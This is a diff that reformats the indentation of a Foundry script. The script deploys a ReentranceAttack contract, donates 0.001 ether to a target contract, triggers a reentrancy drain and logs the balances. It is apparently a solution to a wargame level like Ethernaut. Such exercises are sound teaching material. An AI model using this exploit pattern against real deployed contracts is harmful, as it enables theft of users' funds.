@@ -10,17 +10,17 @@ contract ReentranceScript is Script {
     ReentranceAttack public attacker;
 
     function run() external {
-	vm.startBroadcast();
-	attacker = new ReentranceAttack(address(instance));
-	console.log("ReentranceAttack Contract deployed to:", address(attacker));
-	console.log("ReentranceAttack Contract initial balance:", address(attacker).balance);
-	console.log("Reentrance Contract initial balance:", address(instance).balance);
-	console.log("Donating 0.001 ether...");
-	instance.donate{value: 0.001 ether}(address(attacker));
-	console.log("Attacking...");
-	attacker.attack(0.001 ether);
-	console.log("ReentranceAttack Contract new balance:", address(attacker).balance);
-	console.log("Reentrance Contract new balance:", address(instance).balance);
-	vm.stopBroadcast();
+        vm.startBroadcast();
+        attacker = new ReentranceAttack(address(instance));
+        console.log("ReentranceAttack Contract deployed to:", address(attacker));
+        console.log("ReentranceAttack Contract initial balance:", address(attacker).balance);
+        console.log("Reentrance Contract initial balance:", address(instance).balance);
+        console.log("Donating 0.001 ether...");
+        instance.donate{value: 0.001 ether}(address(attacker));
+        console.log("Attacking...");
+        attacker.attack(0.001 ether);
+        console.log("ReentranceAttack Contract new balance:", address(attacker).balance);
+        console.log("Reentrance Contract new balance:", address(instance).balance);
+        vm.stopBroadcast();
     }
 }
